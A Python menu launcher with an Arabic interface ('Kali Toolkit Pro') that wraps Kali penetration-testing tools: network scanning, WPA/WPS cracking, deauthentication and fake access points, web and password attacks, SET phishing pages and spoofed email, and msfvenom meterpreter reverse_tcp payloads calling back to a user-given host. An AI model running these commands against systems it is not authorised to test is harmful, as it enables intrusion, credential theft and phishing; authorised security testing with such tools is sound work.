#!/usr/bin/env python3
import os
import time
import sys
import subprocess
import platform
from threading import Thread
from datetime import datetime

# إعدادات الألوان للتنسيق في الطرفية
COLORS = {
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'reset': '\033[0m'
}

LOG_FILE = "/var/log/kali_commands.log"

def show_banner():
    """
    عرض الشعار وبعض المعلومات الأساسية عن النظام.
    """
    os.system('clear')
    banner = [
        r"███████╗ █████╗ ██╗██████╗ ███╗   ███╗",
        r"╚══███╔╝██╔══██╗██║██╔══██╗████╗ ████║",
        r"  ███╔╝ ███████║██║██║  ██║██╔████╔██║",
        r" ███╔╝  ██╔══██║██║██║  ██║██║╚██╔╝██║",
        r"███████╗██║  ██║██║██████╔╝██║ ╚═╝ ██║",
        r"╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝     ╚═╝"
    ]
    for line in banner:
        print(COLORS['cyan'] + line + COLORS['reset'])
        time.sleep(0.05)
    print("\n" + "═" * 60)
    show_system_info()







def show_system_info():
    """
    عرض معلومات النظام الأساسية مثل المستخدم والنظام والإصدار والوقت.
    """
    try:
        user = os.getlogin()
    except Exception:
        user = os.getenv('SUDO_USER', 'root')
    sys_info = platform.uname()
    info = [
        f"{COLORS['yellow']}المستخدم:{COLORS['reset']} {user}",
        f"{COLORS['yellow']}النظام:{COLORS['reset']} {sys_info.system}",
        f"{COLORS['yellow']}الإصدار:{COLORS['reset']} {sys_info.release}",
        f"{COLORS['yellow']}الوقت:{COLORS['reset']} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    ]
    print("  ".join(info))
    print("═" * 60)






def log_command(command, success=True):
    """
    تسجيل تنفيذ الأمر في ملف السجل.
    """
    with open(LOG_FILE, 'a') as f:
        status = "SUCCESS" if success else "FAILED"
        f.write(f"[{datetime.now()}] {status}: {command}\n")






def animated_spinner():
    """
    عرض دوران متحرك أثناء تنفيذ الأوامر.
    """
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    while getattr(animated_spinner, "running", True):
        for char in chars:
            sys.stdout.write(f"\r{COLORS['magenta']}{char} {COLORS['reset']}")
            sys.stdout.flush()
            time.sleep(0.1)





def check_package(package):
    """
    التحقق من تثبيت الحزمة باستخدام أمر 'which'.
    """
    try:
        subprocess.check_output(f"which {package}", shell=True, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False





def install_package(pkg_name, install_cmd):
    """
    محاولة تثبيت الحزمة إذا لم تكن مثبتة.
    """
    if check_package(pkg_name):
        print(f"{COLORS['green']}✔ {pkg_name} مثبت مسبقًا{COLORS['reset']}")
        return True

    print(f"{COLORS['yellow']}جارٍ تثبيت {pkg_name}...{COLORS['reset']}")
    try:
        subprocess.run(install_cmd, shell=True, check=True)
        print(f"{COLORS['green']}✔ تم التثبيت بنجاح{COLORS['reset']}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{COLORS['red']}❌ فشل التثبيت: {e}{COLORS['reset']}")
        return False







def execute_command(command, desc, needs_confirmation=False, required_pkg=None):
    """
    تنفيذ الأمر مع عرض وصف مختصر، توضيح للمدخلات، والسماح للمستخدم بتعديل الأمر قبل التنفيذ.
    """
    # التحقق من تثبيت الحزمة المطلوبة
    if required_pkg and not check_package(required_pkg):
        print(f"{COLORS['red']}⚠️ الحزمة المطلوبة '{required_pkg}' غير مثبتة!{COLORS['reset']}")
        choice = input(f"{COLORS['yellow']}هل تريد تثبيتها الآن؟ (y/n): {COLORS['reset']}").strip()
        if choice.lower() == 'y':
            if not install_package(required_pkg, f"sudo apt install {required_pkg} -y"):
                return
        else:
            print(f"{COLORS['red']}تم إلغاء التنفيذ بسبب عدم توفر الحزمة المطلوبة.{COLORS['reset']}")
            return

    # طلب التأكيد من المستخدم إذا كان مطلوبًا
    if needs_confirmation:
        confirm = input(f"\n{COLORS['red']}❗ تأكيد: هل تريد تنفيذ '{desc}'؟ (y/n): {COLORS['reset']}").strip()
        if confirm.lower() != 'y':
            print(f"{COLORS['yellow']}تم إلغاء تنفيذ الأمر.{COLORS['reset']}")
            return

    # عرض الأمر النهائي وإتاحة الفرصة لتعديله
    print(f"\n{COLORS['blue']}الأمر الذي سيتم تنفيذه: {command}{COLORS['reset']}")
    modify = input(f"{COLORS['yellow']}هل ترغب في تعديل الأمر قبل التنفيذ؟ (y/n): {COLORS['reset']}").strip()
    if modify.lower() == 'y':
        new_command = input(f"{COLORS['yellow']}أدخل الأمر الجديد الذي ترغب في تنفيذه: {COLORS['reset']}").strip()
        if new_command:
            command = new_command

    print(f"\n{COLORS['green']}▶▶ {desc} ◀◀{COLORS['reset']}")
    
    # بدء تشغيل دوران مؤقت للإشارة إلى عملية التنفيذ
    animated_spinner.running = True
    spin_thread = Thread(target=animated_spinner)
    spin_thread.start()

    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=300)

        if process.returncode == 0:
            log_command(command, success=True)
            print(f"\n{COLORS['green']}✔ تم التنفيذ بنجاح!{COLORS['reset']}")
            if stdout:
                print(f"\n{COLORS['cyan']}📝 النتائج:\n{stdout}{COLORS['reset']}")
        else:
            log_command(command, success=False)
            print(f"{COLORS['red']}❌ حدث خطأ أثناء التنفيذ:\n{stderr}{COLORS['reset']}")
    except subprocess.TimeoutExpired:
        process.kill()
        print(f"{COLORS['red']}⏰ انتهى الوقت المخصص للتنفيذ!{COLORS['reset']}")
    except Exception as e:
        print(f"{COLORS['red']}❌ خطأ غير متوقع: {e}{COLORS['reset']}")
    finally:
        animated_spinner.running = False
        spin_thread.join()
        sys.stdout.write('\r' + ' ' * 50 + '\r')








def network_tools_menu():
    """
    قائمة أدوات الشبكات المتقدمة.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│         أدوات الشبكات المتقدمة    │
└───────────────────────────────────┘{COLORS['reset']}
1) فحص سريع (nmap -F)
2) فحص مفصل (nmap -A)
3) فحص الأجهزة النشطة (nmap -sn)
4) تحليل الحزم (tcpdump)
5) اختبار الاتصال (ping)
6) مسح المنافذ (masscan)
7) اختبار النطاق الترددي (iperf)
8) تحليل الشبكة (netdiscover)
9) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()
        if choice == '9':
            return

        commands = {
            '1': ("nmap -F ", "فحص سريع للشبكة", True, 'nmap'),
            '2': ("nmap -A ", "فحص مفصل للشبكة", True, 'nmap'),
            '3': ("nmap -sn ", "فحص الأجهزة النشطة", True, 'nmap'),
            '4': ("tcpdump -i any -w capture.pcap", "التقاط وتحليل الحزم", True, 'tcpdump'),
            '5': ("ping -c 4 ", "اختبار الاتصال بالشبكة", False),
            '6': ("masscan -p1-65535 ", "مسح المنافذ السريع", True, 'masscan'),
            '7': ("iperf -s -i 1", "اختبار النطاق الترددي", True, 'iperf'),
            '8': ("netdiscover -i eth0", "اكتشاف الأجهزة المتصلة بالشبكة", True, 'netdiscover')
        }

        if choice in commands:
            cmd, desc, confirm, *pkg = commands[choice]
            required_pkg = pkg[0] if pkg else None
            if choice in ['1', '2', '3', '5', '6']:
                target = input(f"{COLORS['yellow']}يرجى إدخال الهدف (IP أو اسم المضيف): {COLORS['reset']}").strip()
                if not target:
                    print(f"{COLORS['red']}❌ يجب إدخال هدف صحيح!{COLORS['reset']}")
                    continue
                cmd += target
            execute_command(cmd, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")






def wireless_tools_menu():
    """
    قائمة أدوات الشبكات اللاسلكية.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│         أدوات الشبكات اللاسلكية   │
└───────────────────────────────────┘{COLORS['reset']}
1) تفعيل وضع المراقبة على واجهة wlan0
2) مسح الشبكات القريبة (airodump-ng)
3) اختراق WPA/WPA2 باستخدام aircrack-ng
4) هجوم WPS باستخدام reaver
5) هجوم Deauth باستخدام aireplay-ng
6) فك تشفير WEP باستخدام aircrack-ng
7) إنشاء نقطة وصول وهمية
8) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()
        if choice == '8':
            return

        commands = {
            '1': ("airmon-ng start wlan0", "تفعيل وضع المراقبة على wlan0", True, 'aircrack-ng'),
            '2': ("airodump-ng wlan0mon", "مسح الشبكات اللاسلكية القريبة", True, 'aircrack-ng'),
            '3': ("aircrack-ng -w wordlist.txt capture.cap", "اختراق شبكات WPA/WPA2", True, 'aircrack-ng'),
            '4': ("reaver -i wlan0mon -b ", "هجوم WPS على جهاز محدد", True, 'reaver'),
            '5': ("aireplay-ng --deauth 10 -a ", "هجوم Deauth على شبكة محددة", True, 'aircrack-ng'),
            '6': ("aircrack-ng -b ", "فك تشفير WEP لشبكة محددة", True, 'aircrack-ng'),
            '7': ("airbase-ng -a ", "إنشاء نقطة وصول وهمية (يرجى تعديل معلمات ESSID وواجهة الشبكة لاحقًا)", True, 'aircrack-ng')
        }

        if choice in commands:
            cmd, desc, confirm, *pkg = commands[choice]
            required_pkg = pkg[0] if pkg else None
            if choice in ['4', '5', '6']:
                target = input(f"{COLORS['yellow']}أدخل عنوان الـ BSSID للجهاز: {COLORS['reset']}").strip()
                if not target:
                    print(f"{COLORS['red']}❌ يجب إدخال BSSID صحيح!{COLORS['reset']}")
                    continue
                cmd += target
            execute_command(cmd, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")






def web_tools_menu():
    """
    قائمة أدوات اختبار الويب.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│           أدوات اختبار الويب      │
└───────────────────────────────────┘{COLORS['reset']}
1) فحص الثغرات باستخدام nikto
2) فحص SQL Injection باستخدام sqlmap
3) اختبار القوة باستخدام wfuzz
4) مسح الدلائل باستخدام dirb
5) فحص SSL باستخدام testssl
6) فحص WordPress باستخدام wpscan
7) اختبار XSS باستخدام xsser
8) فحص CSRF باستخدام xsrfprobe
9) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()
        if choice == '9':
            return

        commands = {
            '1': ("nikto -h ", "فحص الثغرات باستخدام nikto", True, 'nikto'),
            '2': ("sqlmap -u ", "فحص SQL Injection باستخدام sqlmap", True, 'sqlmap'),
            '3': ("wfuzz -w wordlist.txt ", "اختبار القوة باستخدام wfuzz", True, 'wfuzz'),
            '4': ("dirb ", "مسح الدلائل باستخدام dirb", True, 'dirb'),
            '5': ("testssl ", "فحص SSL باستخدام testssl", True, 'testssl'),
            '6': ("wpscan --url ", "فحص WordPress باستخدام wpscan", True, 'wpscan'),
            '7': ("xsser -u ", "اختبار XSS باستخدام xsser", True, 'xsser'),
            '8': ("xsrfprobe -u ", "فحص CSRF باستخدام xsrfprobe", True, 'xsrfprobe')
        }

        if choice in commands:
            cmd, desc, confirm, *pkg = commands[choice]
            required_pkg = pkg[0] if pkg else None
            target = input(f"{COLORS['yellow']}أدخل الـ URL بالكامل (مثال: http://example.com): {COLORS['reset']}").strip()
            if not target:
                print(f"{COLORS['red']}❌ يجب إدخال URL صحيح!{COLORS['reset']}")
                continue
            cmd += target
            execute_command(cmd, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")







def password_tools_menu():
    """
    قائمة أدوات كلمات المرور.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│         أدوات كلمات المرور        │
└───────────────────────────────────┘{COLORS['reset']}
1) كسر الهاشات باستخدام john
2) هجوم القوة العمياء باستخدام hydra
3) توليد كلمات مرور باستخدام crunch
4) تحليل الهاش باستخدام hashid
5) تحويل الهاش باستخدام hashcat
6) هجوم القاموس باستخدام cewl
7) فك تشفير PDF باستخدام pdfcrack
8) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()
        if choice == '8':
            return

        commands = {
            '1': ("john --format= ", "كسر الهاشات باستخدام john", True, 'john'),
            '2': ("hydra -L users.txt -P pass.txt ", "هجوم القوة العمياء باستخدام hydra", True, 'hydra'),
            '3': ("crunch 6 8 -o wordlist.txt", "توليد كلمات مرور باستخدام crunch", True, 'crunch'),
            '4': ("hashid ", "تحليل الهاش باستخدام hashid", False, 'hashid'),
            '5': ("hashcat -m 0 ", "تحويل أو كسر الهاش باستخدام hashcat", True, 'hashcat'),
            '6': ("cewl -w wordlist.txt ", "توليد قاموس باستخدام cewl", True, 'cewl'),
            '7': ("pdfcrack ", "فك تشفير PDF باستخدام pdfcrack", True, 'pdfcrack')
        }

        if choice in commands:
            cmd, desc, confirm, *pkg = commands[choice]
            required_pkg = pkg[0] if pkg else None
            if choice in ['1', '4', '5', '6', '7']:
                target = input(f"{COLORS['yellow']}أدخل الهاش أو اسم الملف المطلوب (مثال: hash.txt أو الهاش نفسه): {COLORS['reset']}").strip()
                if not target:
                    print(f"{COLORS['red']}❌ يجب إدخال قيمة صحيحة!{COLORS['reset']}")
                    continue
                cmd += target
            elif choice == '2':
                service = input(f"{COLORS['yellow']}أدخل اسم الخدمة المستهدفة (مثال: ssh أو ftp): {COLORS['reset']}").strip()
                if not service:
                    print(f"{COLORS['red']}❌ يجب إدخال اسم الخدمة!{COLORS['reset']}")
                    continue
                cmd += service
            execute_command(cmd, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")






def forensic_tools_menu():
    """
    قائمة أدوات الطب الشرعي.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│           أدوات الطب الشرعي      │
└───────────────────────────────────┘{COLORS['reset']}
1) تحليل الصورة باستخدام binwalk
2) استخراج الملفات باستخدام foremost
3) تحليل الذاكرة باستخدام volatility
4) استخراج البيانات باستخدام bulk_extractor
5) فحص البيانات الوصفية باستخدام exiftool
6) استعادة الملفات باستخدام testdisk
7) استنساخ القرص باستخدام ddrescue
8) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()
        if choice == '8':
            return

        commands = {
            '1': ("binwalk ", "تحليل الصورة باستخدام binwalk", False, 'binwalk'),
            '2': ("foremost -i ", "استخراج الملفات باستخدام foremost", True, 'foremost'),
            '3': ("volatility -f ", "تحليل الذاكرة باستخدام volatility", True, 'volatility'),
            '4': ("bulk_extractor ", "استخراج البيانات باستخدام bulk_extractor", True, 'bulk-extractor'),
            '5': ("exiftool ", "فحص البيانات الوصفية باستخدام exiftool", False, 'exiftool'),
            '6': ("testdisk ", "استعادة الملفات باستخدام testdisk", True, 'testdisk'),
            '7': ("ddrescue ", "استنساخ القرص باستخدام ddrescue", True, 'ddrescue')
        }

        if choice in commands:
            cmd, desc, confirm, *pkg = commands[choice]
            required_pkg = pkg[0] if pkg else None
            target = input(f"{COLORS['yellow']}أدخل مسار الملف أو الجهاز (مثال: /dev/sda أو /path/to/file): {COLORS['reset']}").strip()
            if not target:
                print(f"{COLORS['red']}❌ يجب إدخال مسار صحيح!{COLORS['reset']}")
                continue
            cmd += target
            execute_command(cmd, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")






def social_engineering_menu():
    """
    قائمة أدوات الهندسة الاجتماعية.
    """
    tools = {
        '1': ('setoolkit', 'تشغيل SET Toolkit', True),
        '2': ('phishing-page', 'إنشاء صفحة تصيد باستخدام setoolkit', True),
        '3': ('send-email', 'إرسال بريد إلكتروني مزيف باستخدام setoolkit', True),
        '4': ('generate-payload', 'إنشاء حمولة استغلال باستخدام msfvenom', True),
        '5': ('العودة', 'العودة للقائمة الرئيسية', False)
    }

    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│        أدوات الهندسة الاجتماعية   │
└───────────────────────────────────┘{COLORS['reset']}
1) تشغيل SET Toolkit
2) إنشاء صفحة تصيد
3) إرسال بريد إلكتروني مزيف
4) إنشاء حمولة استغلال
5) العودة
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()

        if choice == '5':
            return

        if choice in tools:
            cmd, desc, confirm = tools[choice]
            if choice == '2':
                target_url = input(f"{COLORS['yellow']}أدخل رابط الموقع المقلد (مثال: http://example.com): {COLORS['reset']}").strip()
                if not target_url:
                    print(f"{COLORS['red']}❌ يجب إدخال رابط صحيح!{COLORS['reset']}")
                    continue
                execute_command(f"sudo setoolkit --url {target_url}", desc, confirm)
            elif choice == '3':
                email_target = input(f"{COLORS['yellow']}أدخل البريد الإلكتروني الهدف: {COLORS['reset']}").strip()
                if not email_target:
                    print(f"{COLORS['red']}❌ يجب إدخال بريد إلكتروني صحيح!{COLORS['reset']}")
                    continue
                execute_command(f"sudo setoolkit --email {email_target}", desc, confirm)
            elif choice == '4':
                payload_type = input(f"{COLORS['yellow']}أدخل نوع الحمولة (windows/android): {COLORS['reset']}").strip().lower()
                if payload_type not in ['windows', 'android']:
                    print(f"{COLORS['red']}❌ يجب اختيار windows أو android فقط!{COLORS['reset']}")
                    continue
                lhost = input(f"{COLORS['yellow']}أدخل الـ IP أو الـ Host الذي سيتم الاتصال به: {COLORS['reset']}").strip()
                lport = input(f"{COLORS['yellow']}أدخل رقم البورت المطلوب (مثال: 5555): {COLORS['reset']}").strip()
                if not lhost or not lport:
                    print(f"{COLORS['red']}❌ يجب إدخال كل من IP وPort بشكل صحيح!{COLORS['reset']}")
                    continue
                output_ext = "exe" if payload_type == "windows" else "apk"
                execute_command(f"msfvenom -p {payload_type}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o  payload.{output_ext}", desc, confirm)
            else:
                execute_command(cmd, desc, confirm)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")




  
def vulnerability_scan_menu():
    """
    قائمة فحص الثغرات الأمنية.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│         فحص الثغرات الأمنية        │
└───────────────────────────────────┘{COLORS['reset']}
1) فحص سريع باستخدام nmap (nmap -Pn --script vuln)
2) فحص متقدم باستخدام OpenVAS
3) فحص القواعد الضعيفة باستخدام lynis
4) فحص تكوينات الخادم باستخدام nikto
5) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأداة: {COLORS['reset']}").strip()

        if choice == '5':
            return

        commands = {
            '1': ("nmap -Pn --script vuln ", "فحص سريع باستخدام nmap", True),
            '2': ("openvas-start", "تشغيل OpenVAS Security Scanner", True),
            '3': ("lynis audit system", "فحص النظام باستخدام lynis", True),
            '4': ("nikto -h ", "فحص تكوينات الخادم باستخدام nikto", True)
        }

        if choice in commands:
            cmd, desc, confirm = commands[choice]
            if choice in ['1', '4']:
                target = input(f"{COLORS['yellow']}أدخل الهدف (IP أو اسم المضيف): {COLORS['reset']}").strip()
                if not target:
                    print(f"{COLORS['red']}❌ يجب إدخال هدف صحيح!{COLORS['reset']}")
                    continue
                cmd += target
            execute_command(cmd, desc, confirm)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")






def report_generator():
    """
    إنشاء تقرير أمني وحفظه في دليل التقارير.
    """
    report_dir = "/var/log/security_reports/"
    os.makedirs(report_dir, exist_ok=True)

    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    report_path = os.path.join(report_dir, filename)

    with open(report_path, 'w') as f:
        f.write(f"تقرير الأمان - {datetime.now()}\n")
        f.write("=" * 50 + "\n")
        f.write(subprocess.getoutput("uname -a") + "\n")
        f.write("\nآخر التحديثات:\n")
        f.write(subprocess.getoutput("apt list --upgradable") + "\n")
        f.write("\nالعمليات النشطة:\n")
        f.write(subprocess.getoutput("ps aux") + "\n")

    print(f"{COLORS['green']}✔ تم إنشاء التقرير في: {report_path}{COLORS['reset']}")






def install_tools_menu():
    """
    تثبيت الحزم المطلوبة التي يستخدمها البرنامج.
    """
    tools = {
        "nmap": "nmap",
        "tcpdump": "tcpdump",
        "masscan": "masscan",
        "iperf": "iperf",
        "netdiscover": "netdiscover",
        "aircrack-ng": "aircrack-ng",
        "nikto": "nikto",
        "sqlmap": "sqlmap",
        "wfuzz": "wfuzz",
        "dirb": "dirb",
        "testssl": "testssl",
        "wpscan": "wpscan",
        "xsser": "xsser",
        "xsrfprobe": "xsrfprobe",
        "john": "john",
        "hydra": "hydra",
        "crunch": "crunch",
        "hashid": "hashid",
        "hashcat": "hashcat",
        "cewl": "cewl",
        "pdfcrack": "pdfcrack",
        "binwalk": "binwalk",
        "foremost": "foremost",
        "volatility": "volatility",
        "bulk-extractor": "bulk-extractor",
        "exiftool": "exiftool",
        "testdisk": "testdisk",
        "ddrescue": "ddrescue",
        "setoolkit": "setoolkit",
        "reaver": "reaver",
        "theharvester": "theharvester",
        "msfvenom": "msfvenom",
        "msfconsole": "msfconsole",
        "htop": "htop"
    }
    print(f"{COLORS['yellow']}سيتم تثبيت الحزم التالية:{COLORS['reset']}")
    for pkg in tools:
        print(f"{COLORS['cyan']}- {pkg}{COLORS['reset']}")
    confirm = input(f"{COLORS['yellow']}هل تريد متابعة التثبيت؟ (y/n): {COLORS['reset']}").strip()
    if confirm.lower() != 'y':
        return
    for pkg in tools:
        install_package(pkg, f"sudo apt install {pkg} -y")


def bluetooth_menu():
    """
    قائمة أوامر البلوتوث.
    """
    while True:
        print(f"""
{COLORS['yellow']}
┌─────────────────────────────────────────┐
│            أوامر البلوتوث               │
└─────────────────────────────────────────┘{COLORS['reset']}
1) تشغيل خدمة البلوتوث (sudo systemctl start bluetooth)
2) إيقاف خدمة البلوتوث (sudo systemctl stop bluetooth)
3) تفعيل البلوتوث (rfkill unblock bluetooth)
4) تعطيل البلوتوث (rfkill block bluetooth)
5) البحث عن الأجهزة (bluetoothctl scan on)
6) عرض الأجهزة المتاحة (bluetoothctl devices)
7) إقران جهاز (bluetoothctl pair <MAC>)
8) الاتصال بجهاز (bluetoothctl connect <MAC>)
9) فصل جهاز (bluetoothctl disconnect <MAC>)
10) العودة للقائمة الرئيسية
        """)

        choice = input(f"{COLORS['green']}اختر رقم الأمر: {COLORS['reset']}").strip()

        if choice == '10':
            return

        commands = {
            '1': ("sudo systemctl start bluetooth", "تشغيل خدمة البلوتوث", True),
            '2': ("sudo systemctl stop bluetooth", "إيقاف خدمة البلوتوث", True),
            '3': ("sudo rfkill unblock bluetooth", "تفعيل البلوتوث", True),
            '4': ("sudo rfkill block bluetooth", "تعطيل البلوتوث", True),
            '5': ("bluetoothctl scan on", "البحث عن الأجهزة", True),
            '6': ("bluetoothctl devices", "عرض الأجهزة المتاحة", True),
            '7': ("bluetoothctl pair ", "إقران جهاز", True),
            '8': ("bluetoothctl connect ", "الاتصال بجهاز", True),
            '9': ("bluetoothctl disconnect ", "فصل جهاز", True)
        }

        if choice in commands:
            cmd, desc, confirm = commands[choice]
            if choice in ['7', '8', '9']:
                mac = input(f"{COLORS['yellow']}أدخل عنوان MAC للجهاز: {COLORS['reset']}").strip()
                if not mac:
                    print(f"{COLORS['red']}❌ يجب إدخال عنوان MAC صحيح!{COLORS['reset']}")
                    continue
                cmd += mac
            execute_command(cmd, desc, confirm)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")





def show_menu():
    """
    عرض القائمة الرئيسية للبرنامج.
    """
    menu = f"""
{COLORS['yellow']}
┌───────────────────────────────────┐
│        Kali Toolkit Pro v7.0      │
└───────────────────────────────────┘
{COLORS['cyan']}
[ الإعدادات الأساسية ]
1) تثبيت الحزم المطلوبة
2) تحديث النظام

[ الشبكات والأمان ]
3) فحص الشبكة باستخدام nmap
4) أدوات الواي فاي المتقدمة
5) فحص الثغرات الأمنية

[ الهندسة الاجتماعية ]
6) أدوات التصيد والهندسة الاجتماعية

[ إدارة النظام ]
7) إنشاء تقرير أمني
8) مراقبة الموارد باستخدام htop
9) تنظيف النظام

[ خيارات متقدمة ]
10) Metasploit Framework
11) جمع المعلومات باستخدام theHarvester
12) إدارة الحمولات باستخدام MSFvenom
13) ادارة البلوتوث

0) الخروج
{COLORS['reset']}
    """
    print(menu)






def main():
    """
    الدالة الرئيسية التي تدير تدفق البرنامج.
    """
    if os.geteuid() != 0:
        print(f"{COLORS['red']}يجب تشغيل البرنامج بصلاحيات root!{COLORS['reset']}")
        sys.exit()

    show_banner()

    commands = {
        '1': install_tools_menu,
        '2': ("sudo apt update && sudo apt full-upgrade -y", "تحديث النظام", True),
        '3': ("nmap -sV ", "فحص الشبكة باستخدام nmap", True, 'nmap'),
        '4': wireless_tools_menu,
        '5': vulnerability_scan_menu,
        '6': social_engineering_menu,
        '7': report_generator,
        '8': ("htop", "مراقبة الموارد باستخدام htop", False, 'htop'),
        '9': ("sudo apt autoremove -y && sudo apt clean", "تنظيف النظام", True),
        '10': ("msfconsole", "Metasploit Framework", True, 'msfconsole'),
        '11': ("theHarvester -d ", "جمع المعلومات باستخدام theHarvester", True, 'theharvester'),
        '12': ("msfvenom -p ", "إنشاء حمولة استغلال باستخدام msfvenom", True, 'msfvenom'),
        '13':bluetooth_menu,
        '0': ("exit", "الخروج", False)
    }

    while True:
        show_menu()
        choice = input(f"\n{COLORS['green']}▶ اختر رقم الأمر: {COLORS['reset']}").strip()

        if choice == '0':
            print(f"\n{COLORS['red']}⎋ تم الخروج من البرنامج!{COLORS['reset']}")
            sys.exit()

        if choice in commands:
            cmd_data = commands[choice]
            if callable(cmd_data):
                cmd_data()
            else:
                command, desc, confirm, *pkg = cmd_data
                required_pkg = pkg[0] if pkg else None
                if choice in ['11', '12']:
                    param = input(f"{COLORS['yellow']}أدخل المعامل المطلوب (مثال: target.com أو معلمة أخرى): {COLORS['reset']}").strip()
                    if not param:
                        print(f"{COLORS['red']}❌ يجب إدخال معاملة صحيحة!{COLORS['reset']}")
                        continue
                    command += param
                execute_command(command, desc, confirm, required_pkg)
        else:
            print(f"{COLORS['red']}❌ خيار غير صالح!{COLORS['reset']}")

        input(f"\n{COLORS['yellow']}↵ اضغط Enter للمتابعة...{COLORS['reset']}")
        show_banner()






if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLORS['red']}تم إنهاء البرنامج بواسطة المستخدم.{COLORS['reset']}")
        sys.exit()
